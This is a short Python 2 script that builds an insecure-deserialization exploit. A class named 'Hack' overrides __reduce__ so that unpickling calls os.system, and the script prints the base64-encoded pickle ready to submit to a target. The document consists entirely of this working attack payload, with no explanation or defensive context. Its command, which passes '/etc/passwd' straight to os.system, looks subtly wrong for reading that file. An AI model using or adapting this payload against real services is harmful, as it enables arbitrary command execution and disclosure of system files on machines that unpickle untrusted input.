import cPickle
import os
import base64

class Hack(object):
  def __reduce__(self):
    return (os.system,("/etc/passwd",))

print base64.b64encode(cPickle.dumps(Hack()))
